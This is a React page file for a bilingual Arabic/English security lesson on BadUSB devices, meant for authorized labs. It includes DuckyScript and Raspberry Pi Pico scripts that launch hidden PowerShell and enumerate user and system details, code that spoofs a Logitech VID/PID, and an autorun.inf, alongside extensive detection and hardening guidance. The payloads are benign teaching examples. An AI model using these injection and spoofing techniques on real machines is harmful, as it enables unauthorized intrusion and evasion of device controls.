"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="usb-attack-lab">
      <L
        ar={<>
          <Section title="نطاق هذا الدرس">
            <p>الدرس السابق (<span className="eng">usb-network-implants</span>) شرح <i>ماذا</i> ولماذا. هذا الدرس يجيب على <i>كيف نبنيها بأيدينا</i> في مختبر مرخّص — وكيف نكتشفها كمدافعين. كل أمثلة الكود هنا <b>تعليمية</b>: تفتح Notepad، تكتب علامة في ملف، تطبع رسالة. <u>لا تحتوي C2 ولا سرقة بيانات</u>.</p>
            <Analogy>الفرق بين دراسة القفل وكسره. هنا نفكّ القفل في الورشة، نرسم آليته، ثم نصنع قفلاً أصعب. لا نستخدم المهارة على بيت الجار.</Analogy>
            <Callout kind="danger" title="حدود قانونية صارمة">
              <ul>
                <li>كل سكربت هنا <b>قانوني فقط</b> داخل: حاسوبك، VM في مختبرك، عقد red team موقّع، أو تقييم تحت تفويض حكومي.</li>
                <li>تشغيل أيٍ منها على كمبيوتر زميل/عائلة/شركة بدون إذن مكتوب = جناية تحت CFAA §1030(a)(5)(A).</li>
                <li>حتى &quot;مزحة&quot; على جهاز شخص آخر يمكن أن تنتج ملفاً جنائياً فيدرالياً.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="إعداد مختبر آمن قبل أي شيء">
            <Step n={1} title="VM معزولة">
              <p>VirtualBox أو VMware Workstation. Windows 10/11 trial أو Linux. شبكة <span className="eng">Host-Only</span> أو <span className="eng">Internal</span> — <b>لا</b> NAT ولا Bridge. snapshot قبل كل تجربة.</p>
            </Step>
            <Step n={2} title="ممرّ USB إلى الـ VM">
              <p>VirtualBox: <span className="eng">Devices → USB → اختر الجهاز</span>. هذا يضمن أن BadUSB لا يلمس المضيف الحقيقي. لو كنت على Mac/Linux مضيف، الأفضل استخدام آلة فيزيائية &quot;قربان&quot; قديمة.</p>
            </Step>
            <Step n={3} title="أدوات تحتاجها">
              <ul>
                <li><span className="eng">Hak5 Payload Studio</span> (مجاني، ويب) — لكتابة DuckyScript.</li>
                <li><span className="eng">Raspberry Pi Pico</span> ($4) — أرخص بديل عن Rubber Ducky ($60).</li>
                <li><span className="eng">CircuitPython</span> + مكتبة <span className="eng">adafruit_hid</span> — ما يحوّل Pico لـ HID.</li>
                <li>محرر نصوص + Wireshark + USBPcap (لتحليل ما يحدث على ناقل USB).</li>
              </ul>
            </Step>
            <Step n={4} title="منطق &quot;canary&quot; في كل سكربت تجريبي">
              <p>لتجنب كارثة، اجعل كل سكربت يبحث عن ملف <span className="eng">C:\\LAB_OK.txt</span> ولا ينفذ شيئاً إن لم يجده. هكذا لو ضاع USB من الطاولة لن يضرّ جهازاً عشوائياً.</p>
            </Step>
          </Section>

          <Section title="مثال 1 — DuckyScript: &quot;hello world&quot; لـ BadUSB">
            <p>هذا أبسط سكربت ممكن. يفتح Notepad ويكتب نصاً. الهدف: فهم بنية DuckyScript قبل أي شيء أعقد.</p>
            <Code lang="DuckyScript">{`REM أبسط PoC تعليمي — يفتح Notepad ويكتب علامة
DELAY 1500            REM انتظر تعرّف النظام على "لوحة المفاتيح"
GUI r                 REM Win+R = فتح Run
DELAY 300
STRING notepad
ENTER
DELAY 800
STRING USB lab test - educational only - $(Get-Date)
ENTER
STRING This file proves the HID could type. No payload executed.`}</Code>
            <p><b>ما الذي يعلّمه:</b> ضربات المفاتيح (<span className="eng">STRING</span>)، المفاتيح الخاصة (<span className="eng">GUI, ENTER</span>)، وأهمية <span className="eng">DELAY</span> — بدونها السكربت يكتب قبل أن يفتح Notepad فيضيع الإدخال.</p>
          </Section>

          <Section title="مثال 2 — DuckyScript بـ canary وحدود تنفيذ آمنة">
            <Code lang="DuckyScript">{`REM PoC تعليمي مع canary — لن ينفذ ما لم يجد ملف اختبار
DELAY 1500
GUI r
DELAY 300
STRING powershell -w hidden -nop -c "if (Test-Path C:\\LAB_OK.txt) { Add-Content C:\\LAB_OK.txt ('USB-PoC ran at ' + (Get-Date)) } else { exit }"
ENTER`}</Code>
            <p>سطر واحد PowerShell يتحقق من وجود علامة. لو فتحت USB بالخطأ على جهاز ليس فيه <span className="eng">C:\\LAB_OK.txt</span>، لا يحدث شيء. هذا نمط &quot;safety net&quot; مهم في مختبرات التدريب.</p>
            <Callout kind="info" title="لماذا canary مهم">
              في تدريب 2019، فريق جامعي فقد USB &quot;معطّل&quot; في مقهى. شخص أوصله بحاسوبه. لو كان فيه canary، لما حدث شيء؛ بدونه، الفريق دفع غرامة و كاد يفقد ترخيصه.
            </Callout>
          </Section>

          <Section title="مثال 3 — اكتشاف بيئة قبل الإقلاع">
            <p>سكربت تعليمي يطبع نوع نظام التشغيل ولغة لوحة المفاتيح إلى ملف. هذا نمط حقيقي يستخدمه المهاجمون لتعديل لاحق للحمولة — لكن هنا نوقف عند &quot;اعرف فقط&quot;.</p>
            <Code lang="DuckyScript">{`REM PoC: enumerate environment, write to file, exit
DELAY 1500
GUI r
DELAY 300
STRING powershell -w hidden -nop -c "if (-not (Test-Path C:\\LAB_OK.txt)) { exit }; $info = @{ os = $PSVersionTable.OS; user = $env:USERNAME; lang = (Get-Culture).Name; time = (Get-Date) }; $info | Out-File C:\\LAB_OK.txt -Append"
ENTER`}</Code>
            <p><b>القيمة الدفاعية:</b> فهم أن المهاجم يحتاج <i>5–15 ثانية</i> ليجمع هذه المعلومة الأولية. EDR الذي يصطاد &quot;PowerShell hidden launched seconds after USB plug&quot; يكسر السلسلة قبل أن تبدأ.</p>
          </Section>

          <Section title="مثال 4 — Raspberry Pi Pico كـ BadUSB بـ $4">
            <p>Pi Pico بـ <span className="eng">CircuitPython</span> + <span className="eng">adafruit_hid</span> يكافئ Rubber Ducky تجارياً. كامل الكود تعليمي ومفتوح:</p>
            <Step n={1} title="إعداد Pico">
              <ul>
                <li>حمّل firmware CircuitPython من <span className="eng">circuitpython.org</span> اضغط زر BOOTSEL أثناء التوصيل، اسحب ملف .uf2 إلى الـ drive الذي يظهر.</li>
                <li>انسخ مكتبة <span className="eng">adafruit_hid</span> إلى مجلد <span className="eng">/lib</span> في الـ Pico.</li>
                <li>عدّل <span className="eng">code.py</span> أدناه.</li>
              </ul>
            </Step>
            <Code lang="python">{`# code.py — PoC تعليمي على Raspberry Pi Pico
# يفتح Notepad ويكتب علامة، ثم يتوقف نهائياً.
# لا يحوي اتصال شبكي ولا تنفيذ ثنائي.

import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# تأخير الإقلاع — ينتظر تعرّف النظام على HID
time.sleep(2.5)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Win+R
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.4)

# اكتب الأمر
layout.write("notepad\\n")
time.sleep(1.0)

# اكتب رسالة تعليمية ثم توقف
layout.write("Pi Pico BadUSB lab test - educational PoC only.\\n")
layout.write("No network, no exec, no payload.\\n")

# قفل لمنع تكرار التنفيذ
while True:
    time.sleep(60)`}</Code>
            <Callout kind="info" title="لماذا Pico أهم تعليمياً من Rubber Ducky">
              Rubber Ducky &quot;صندوق أسود&quot; — تشتري وتستخدم. Pico مفتوح: ترى الـ firmware، ترى التوقيت، ترى كل API. تتعلم كيف يعمل الـ enumeration، تتعلم لماذا تأخير 2.5 ثانية، تتعلم كيف يتغيّر الـ <span className="eng">VID/PID</span>. هذا ما يجعل المدافع أفضل في الكشف.
            </Callout>
          </Section>

          <Section title="مثال 5 — انتحال جهاز موثوق (VID/PID spoofing)">
            <p>كل جهاز USB يقدّم نفسه بـ <span className="eng">Vendor ID + Product ID</span>. أنظمة GPO تسمح أحياناً بـ &quot;Logitech keyboards&quot; فقط. الهجوم: عدّل descriptors لتقول إنك Logitech.</p>
            <Code lang="python">{`# في boot.py على Pico — قبل أي شيء آخر
import usb_hid
import supervisor

# أمثلة VID/PID — موجودة في قواعد بيانات USB-IF العامة
# 046d:c31c = Logitech generic keyboard
supervisor.set_usb_identification(
    manufacturer="Logitech",
    product="USB Keyboard",
    vid=0x046D,
    pid=0xC31C,
)`}</Code>
            <Callout kind="good" title="الدفاع — لماذا VID/PID وحده لا يكفي">
              قاعدة whitelist بـ VID/PID فقط = أمن مزيف. الدفاع الجاد يطلب: <b>(VID + PID + Serial Number)</b>. الـ Serial فريد لكل جهاز فعلي. <span className="eng">USBGuard</span> على Linux و <span className="eng">Device Installation Restrictions</span> على Windows يدعمان هذا. كل لوحة مفاتيح مؤسسية مسجّلة بـ serial، أي جديدة = مرفوض.
            </Callout>
          </Section>

          <Section title="مثال 6 — autorun الكلاسيكي (لِمَ ما زال يهم)">
            <p>منذ Windows 7 SP1 معطّل افتراضياً، لكن: (أ) أنظمة OT/ICS كثيرة ما زالت تعمل XP/7 RTM، (ب) بعض GPO تعيد تفعيله للـ &quot;ملاءمة&quot;.</p>
            <Code lang="ini">{`; autorun.inf تعليمي — على XP/7 RTM يفتح ملف عند الإدخال
[autorun]
open=demo.exe
icon=demo.ico
label=Lab USB
action=Open lab demo`}</Code>
            <Callout kind="good" title="الدفاع">
              <ol>
                <li>تأكد عبر GPO أن <span className="eng">NoDriveTypeAutoRun = 0xFF</span>.</li>
                <li>على ICS: ابن &quot;USB sanitization kiosk&quot; (Olea, OPSWAT) قبل أي توصيل بشبكة OT.</li>
                <li>افحص الـ USB في sandbox منفصل (Cuckoo, ANY.RUN) إن كان مصدره خارجياً.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="مثال 7 — رؤية ما يحدث على الناقل (USBPcap)">
            <p>قبل أن تدافع، شاهد. <span className="eng">Wireshark + USBPcap</span> على Windows أو <span className="eng">usbmon</span> على Linux يظهران كل packet HID.</p>
            <Terminal lines={[
              { p: "# Linux — مراقبة USB bus 1:" },
              { p: "sudo modprobe usbmon" },
              { p: "sudo wireshark -i usbmon1 -k" },
              { p: "" },
              { p: "# في Wireshark، فلتر للـ HID فقط:" },
              { p: "usbhid.data" },
              { o: "URB_INTERRUPT in   0x04 0x00 0x15 0x00 0x00 ...   ← keystroke 'r'" },
              { o: "URB_INTERRUPT in   0x00 0x00 0x00 0x00 0x00 ...   ← key release" },
            ]} />
            <p>هذه الرؤية تكشف: Pico/Ducky يطلق <b>عشرات keystrokes في ثانية واحدة</b>. لا بشري يكتب بهذا الإيقاع. التوقيع التحليلي بسيط جداً للـ EDR ليكتشفه.</p>
          </Section>

          <Section title="بناء الدفاع طبقة طبقة">
            <Callout kind="good" title="طبقة 1 — السياسة (Policy)">
              <ul>
                <li>سياسة USB مكتوبة وموقّعة. حظر افتراضي، استثناءات بطلب.</li>
                <li>تدريب موظفين كل 6 أشهر بـ drop-test فعلي.</li>
                <li>في OT/ICS: كل USB يدخل عبر kiosk تنظيف فقط.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="طبقة 2 — التحكم التقني على المضيف">
              <ul>
                <li><b>Windows GPO:</b> <span className="eng">Computer Configuration → Administrative Templates → System → Device Installation → Device Installation Restrictions</span>. اسمح فقط بـ device IDs محددة.</li>
                <li><b>USBGuard على Linux:</b></li>
              </ul>
              <Code lang="bash">{`sudo apt install usbguard
sudo usbguard generate-policy > /etc/usbguard/rules.conf
sudo systemctl enable --now usbguard
# قاعدة مثال — اسمح فقط بـ keyboard مسجّل بـ serial:
# allow id 046d:c31c serial "ABC123XYZ"
# block`}</Code>
              <ul>
                <li><b>macOS:</b> اطلب موافقة لكل ملحق USB جديد (System Settings → Privacy & Security → Allow accessories).</li>
                <li><b>BIOS:</b> عطّل USB boot، اقفل BIOS بكلمة سر، عطّل منافذ غير مستخدمة فيزيائياً (epoxy في بعض بيئات SCIF).</li>
              </ul>
            </Callout>
            <Callout kind="good" title="طبقة 3 — اكتشاف على EDR">
              <ul>
                <li>قاعدة Sigma: &quot;HID device added then PowerShell.exe child of explorer.exe within 10s&quot; → high-severity alert.</li>
                <li>قاعدة: &quot;keystroke rate &gt; 300 chars/sec&quot; — لا بشري يكتب بهذا.</li>
                <li>قاعدة: &quot;new VID/PID combination not in CMDB&quot; → quarantine.</li>
                <li>تتبع <span className="eng">DeviceEvents</span> في Microsoft Defender for Endpoint — لها schema جاهز.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="طبقة 4 — اكتشاف على الشبكة (لو فلت BadUSB)">
              <ul>
                <li>egress baseline: لو محطة عمل فجأة فتحت اتصال خارجي بنطاق غير مألوف خلال دقيقة من event &quot;USB inserted&quot; → تحقيق.</li>
                <li>Sysmon Event ID 22 (DNS query) + Event ID 1 (Process create) للـ <span className="eng">powershell.exe</span> = correlation قوية.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="طبقة 5 — الفيزيائية">
              <ul>
                <li>أغطية USB مقفلة (PadJacks).</li>
                <li>كاميرات مراقبة تركّز على المنافذ في غرف الخوادم/SCADA.</li>
                <li>سياسة &quot;لا أجهزة شخصية&quot; في مناطق تصنيف.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="قائمة فحص للـ Red Team — قبل التشغيل في عملية مرخّصة">
            <ul>
              <li>تفويض مكتوب يغطي USB drops و BadUSB صريحاً (<span className="eng">Rules of Engagement</span>).</li>
              <li>تحديد المواقع المسموح إسقاط USB فيها — لا تتسلل إلى مناطق ليست في النطاق.</li>
              <li>كل USB يحوي canary — لن ينفذ خارج الـ environment المتفق عليه.</li>
              <li>تسجيل serial numbers لكل قطعة — حتى يُمكن استرجاعها بعد العملية.</li>
              <li>POC إخطار للمدير الأمني للهدف لو شيء انفلت من السيطرة.</li>
              <li>تقرير ما بعد العملية: ماذا التُقط، كم نقر المستخدمون، ما الكشف الذي عمل، ما الذي فشل.</li>
            </ul>
          </Section>

          <Section title="مراجع تطبيقية">
            <ul>
              <li><span className="eng">Hak5 DuckyScript 3.0 reference</span> — اللغة الكاملة</li>
              <li><span className="eng">Adafruit CircuitPython HID guide</span> — لـ Pi Pico</li>
              <li><span className="eng">Microsoft Device Installation Restrictions docs</span></li>
              <li><span className="eng">USBGuard project (github.com/USBGuard)</span></li>
              <li><span className="eng">Sigma rules repo: rules/windows/sysmon — usb_</span> patterns</li>
              <li><span className="eng">SANS FOR509 / FOR526</span> للـ memory/USB forensics</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="Scope of this lesson">
            <p>The previous lesson (<span className="eng">usb-network-implants</span>) covered <i>what</i> and <i>why</i>. This one answers <i>how do we build it ourselves</i> in an authorized lab — and how we detect it as defenders. Every code example here is <b>educational</b>: it opens Notepad, writes a marker file, prints a string. <u>No C2, no data theft</u>.</p>
            <Analogy>The difference between studying a lock and breaking one. Here we open the lock on the workbench, sketch the mechanism, then design a stronger lock. We don&apos;t take the skill to a neighbor&apos;s door.</Analogy>
            <Callout kind="danger" title="Hard legal boundary">
              <ul>
                <li>Every script here is <b>legal only</b> on: your own computer, a VM in your lab, a signed red-team engagement, or a written government authorization.</li>
                <li>Running any of these on a coworker&apos;s/family/company machine without written consent = federal felony under CFAA §1030(a)(5)(A).</li>
                <li>Even a &quot;prank&quot; on someone else&apos;s device can produce a federal docket number.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Set up a safe lab first">
            <Step n={1} title="Isolated VM">
              <p>VirtualBox or VMware Workstation. Windows 10/11 trial or Linux. Network set to <span className="eng">Host-Only</span> or <span className="eng">Internal</span> — <b>not</b> NAT, not Bridge. Snapshot before each experiment.</p>
            </Step>
            <Step n={2} title="USB pass-through to the VM">
              <p>VirtualBox: <span className="eng">Devices → USB → choose the device</span>. This guarantees BadUSB doesn&apos;t touch the host. If your host is a Mac/Linux you can&apos;t reset, prefer a dedicated &quot;sacrificial&quot; old laptop.</p>
            </Step>
            <Step n={3} title="Tools you need">
              <ul>
                <li><span className="eng">Hak5 Payload Studio</span> (free, web) — to write DuckyScript.</li>
                <li><span className="eng">Raspberry Pi Pico</span> ($4) — cheapest Rubber Ducky alternative ($60).</li>
                <li><span className="eng">CircuitPython</span> + <span className="eng">adafruit_hid</span> — what turns the Pico into a HID.</li>
                <li>Text editor + Wireshark + USBPcap (to see what hits the USB bus).</li>
              </ul>
            </Step>
            <Step n={4} title="Canary logic in every test script">
              <p>To avoid disasters, make every script check for a marker file (e.g. <span className="eng">C:\\LAB_OK.txt</span>) and exit if absent. If a USB falls off the table, it harms no random machine.</p>
            </Step>
          </Section>

          <Section title="Example 1 — DuckyScript: BadUSB &quot;hello world&quot;">
            <p>The simplest possible script. Opens Notepad, types text. Goal: understand DuckyScript structure before anything more complex.</p>
            <Code lang="DuckyScript">{`REM Educational PoC — opens Notepad and types a marker
DELAY 1500            REM let the OS enumerate the "keyboard"
GUI r                 REM Win+R = open Run
DELAY 300
STRING notepad
ENTER
DELAY 800
STRING USB lab test - educational only - $(Get-Date)
ENTER
STRING This file proves the HID could type. No payload executed.`}</Code>
            <p><b>What this teaches:</b> keystrokes (<span className="eng">STRING</span>), special keys (<span className="eng">GUI, ENTER</span>), and the importance of <span className="eng">DELAY</span> — without it the script types before Notepad opens and the input is lost.</p>
          </Section>

          <Section title="Example 2 — DuckyScript with a canary and safe limits">
            <Code lang="DuckyScript">{`REM Educational PoC with canary — does nothing if the marker file is absent
DELAY 1500
GUI r
DELAY 300
STRING powershell -w hidden -nop -c "if (Test-Path C:\\LAB_OK.txt) { Add-Content C:\\LAB_OK.txt ('USB-PoC ran at ' + (Get-Date)) } else { exit }"
ENTER`}</Code>
            <p>One PowerShell line checks for a marker. If the USB plugs into a machine without <span className="eng">C:\\LAB_OK.txt</span>, nothing happens. This is a &quot;safety net&quot; pattern essential in training labs.</p>
            <Callout kind="info" title="Why the canary matters">
              In a 2019 university training, a team lost a &quot;disabled&quot; USB at a coffee shop. Someone plugged it into their laptop. With a canary, nothing would have happened. Without one, the team paid a fine and nearly lost certification.
            </Callout>
          </Section>

          <Section title="Example 3 — environment enumeration before any action">
            <p>Educational script that records OS version and keyboard locale to a file. This is a real pattern attackers use to retarget the payload — but here we stop at &quot;just learn&quot;.</p>
            <Code lang="DuckyScript">{`REM PoC: enumerate environment, write to file, exit
DELAY 1500
GUI r
DELAY 300
STRING powershell -w hidden -nop -c "if (-not (Test-Path C:\\LAB_OK.txt)) { exit }; $info = @{ os = $PSVersionTable.OS; user = $env:USERNAME; lang = (Get-Culture).Name; time = (Get-Date) }; $info | Out-File C:\\LAB_OK.txt -Append"
ENTER`}</Code>
            <p><b>Defensive value:</b> understand that the attacker needs <i>5–15 seconds</i> to gather initial recon. An EDR rule that hunts &quot;hidden PowerShell launched seconds after USB plug&quot; breaks the chain before it begins.</p>
          </Section>

          <Section title="Example 4 — Raspberry Pi Pico as $4 BadUSB">
            <p>Pi Pico with <span className="eng">CircuitPython</span> + <span className="eng">adafruit_hid</span> matches a commercial Rubber Ducky. Full code is open-source educational:</p>
            <Step n={1} title="Pico setup">
              <ul>
                <li>Download CircuitPython firmware from <span className="eng">circuitpython.org</span>, hold BOOTSEL while plugging in, drag the .uf2 onto the drive that appears.</li>
                <li>Copy the <span className="eng">adafruit_hid</span> library into <span className="eng">/lib</span> on the Pico.</li>
                <li>Edit <span className="eng">code.py</span> below.</li>
              </ul>
            </Step>
            <Code lang="python">{`# code.py — educational PoC on Raspberry Pi Pico
# Opens Notepad, types a marker, then halts.
# No network access, no binary execution.

import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Boot delay — wait for HID enumeration
time.sleep(2.5)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Win+R
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.4)

# type the command
layout.write("notepad\\n")
time.sleep(1.0)

# educational message, then halt
layout.write("Pi Pico BadUSB lab test - educational PoC only.\\n")
layout.write("No network, no exec, no payload.\\n")

# lock to prevent re-execution
while True:
    time.sleep(60)`}</Code>
            <Callout kind="info" title="Why Pico beats Rubber Ducky pedagogically">
              The Rubber Ducky is a black box — buy and use. The Pico is open: you see the firmware, the timing, every API. You learn how enumeration works, why a 2.5s boot delay matters, how <span className="eng">VID/PID</span> changes. That makes you a sharper defender.
            </Callout>
          </Section>

          <Section title="Example 5 — spoofing a trusted device (VID/PID)">
            <p>Every USB device presents itself with a <span className="eng">Vendor ID + Product ID</span>. Some GPO whitelists allow only &quot;Logitech keyboards&quot;. The attack: change the descriptors to claim Logitech.</p>
            <Code lang="python">{`# In boot.py on the Pico — runs before anything else
import usb_hid
import supervisor

# Example VID/PID — public values from USB-IF databases
# 046d:c31c = Logitech generic keyboard
supervisor.set_usb_identification(
    manufacturer="Logitech",
    product="USB Keyboard",
    vid=0x046D,
    pid=0xC31C,
)`}</Code>
            <Callout kind="good" title="Defense — why VID/PID alone is not enough">
              A whitelist on VID/PID alone is theatre. Serious defense requires <b>(VID + PID + Serial Number)</b>. The serial is unique per physical device. <span className="eng">USBGuard</span> on Linux and <span className="eng">Device Installation Restrictions</span> on Windows both support this. Every enterprise keyboard is enrolled by serial; a new one = denied.
            </Callout>
          </Section>

          <Section title="Example 6 — classic autorun (and why it still matters)">
            <p>Disabled by default since Windows 7 SP1, but: (a) many OT/ICS systems still run XP / 7 RTM, (b) some GPOs re-enable it for &quot;convenience&quot;.</p>
            <Code lang="ini">{`; Educational autorun.inf — on XP / 7 RTM opens a file at insertion
[autorun]
open=demo.exe
icon=demo.ico
label=Lab USB
action=Open lab demo`}</Code>
            <Callout kind="good" title="Defense">
              <ol>
                <li>Verify via GPO that <span className="eng">NoDriveTypeAutoRun = 0xFF</span>.</li>
                <li>On ICS: deploy a USB sanitization kiosk (Olea, OPSWAT) before any plug into the OT network.</li>
                <li>Detonate any externally-sourced USB inside a separate sandbox first (Cuckoo, ANY.RUN).</li>
              </ol>
            </Callout>
          </Section>

          <Section title="Example 7 — see what hits the bus (USBPcap)">
            <p>Before defending, observe. <span className="eng">Wireshark + USBPcap</span> on Windows or <span className="eng">usbmon</span> on Linux show every HID packet.</p>
            <Terminal lines={[
              { p: "# Linux — monitor USB bus 1:" },
              { p: "sudo modprobe usbmon" },
              { p: "sudo wireshark -i usbmon1 -k" },
              { p: "" },
              { p: "# In Wireshark, filter to HID only:" },
              { p: "usbhid.data" },
              { o: "URB_INTERRUPT in   0x04 0x00 0x15 0x00 0x00 ...   ← keystroke 'r'" },
              { o: "URB_INTERRUPT in   0x00 0x00 0x00 0x00 0x00 ...   ← key release" },
            ]} />
            <p>The view reveals: a Pico/Ducky fires <b>dozens of keystrokes per second</b>. No human types like that. The analytic signature is trivial for an EDR to catch.</p>
          </Section>

          <Section title="Defense, layer by layer">
            <Callout kind="good" title="Layer 1 — policy">
              <ul>
                <li>Written, signed USB policy. Default-deny; exceptions on request.</li>
                <li>Train employees every 6 months with a real drop test.</li>
                <li>OT/ICS: every USB enters via a sanitization kiosk only.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="Layer 2 — host-side technical control">
              <ul>
                <li><b>Windows GPO:</b> <span className="eng">Computer Configuration → Administrative Templates → System → Device Installation → Device Installation Restrictions</span>. Allow only specific device IDs.</li>
                <li><b>USBGuard on Linux:</b></li>
              </ul>
              <Code lang="bash">{`sudo apt install usbguard
sudo usbguard generate-policy > /etc/usbguard/rules.conf
sudo systemctl enable --now usbguard
# Example rule — allow only an enrolled keyboard by serial:
# allow id 046d:c31c serial "ABC123XYZ"
# block`}</Code>
              <ul>
                <li><b>macOS:</b> require approval for every new USB accessory (System Settings → Privacy &amp; Security → Allow accessories).</li>
                <li><b>BIOS:</b> disable USB boot, password-protect BIOS, physically disable unused ports (epoxy in some SCIF setups).</li>
              </ul>
            </Callout>
            <Callout kind="good" title="Layer 3 — EDR detection">
              <ul>
                <li>Sigma rule: &quot;HID device added then PowerShell.exe child of explorer.exe within 10s&quot; → high-severity alert.</li>
                <li>Rule: &quot;keystroke rate &gt; 300 chars/sec&quot; — no human types that fast.</li>
                <li>Rule: &quot;new VID/PID combination not in CMDB&quot; → quarantine.</li>
                <li>Track <span className="eng">DeviceEvents</span> in Microsoft Defender for Endpoint — schema is ready.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="Layer 4 — network detection (if BadUSB slipped through)">
              <ul>
                <li>Egress baseline: a workstation that suddenly opens an outbound connection to an unfamiliar domain within a minute of a &quot;USB inserted&quot; event → investigate.</li>
                <li>Sysmon Event ID 22 (DNS) + Event ID 1 (Process create) for <span className="eng">powershell.exe</span> = strong correlation.</li>
              </ul>
            </Callout>
            <Callout kind="good" title="Layer 5 — physical">
              <ul>
                <li>Locked port covers (PadJacks).</li>
                <li>CCTV focused on ports in server / SCADA rooms.</li>
                <li>&quot;No personal devices&quot; policy in classified zones.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Red-team checklist before running an authorized op">
            <ul>
              <li>Written authorization explicitly covering USB drops and BadUSB (<span className="eng">Rules of Engagement</span>).</li>
              <li>Approved drop locations — never wander into out-of-scope areas.</li>
              <li>Every USB carries a canary — won&apos;t fire outside the agreed environment.</li>
              <li>Serial numbers logged for every unit — recoverable post-engagement.</li>
              <li>Point-of-contact for the target&apos;s security manager if anything escapes control.</li>
              <li>After-action report: what was captured, click-rate, what detected, what missed.</li>
            </ul>
          </Section>

          <Section title="Hands-on references">
            <ul>
              <li><span className="eng">Hak5 DuckyScript 3.0 reference</span> — full language</li>
              <li><span className="eng">Adafruit CircuitPython HID guide</span> — for the Pi Pico</li>
              <li><span className="eng">Microsoft Device Installation Restrictions docs</span></li>
              <li><span className="eng">USBGuard project (github.com/USBGuard)</span></li>
              <li><span className="eng">Sigma rules repo: rules/windows/sysmon — usb_</span> patterns</li>
              <li><span className="eng">SANS FOR509 / FOR526</span> for memory / USB forensics</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
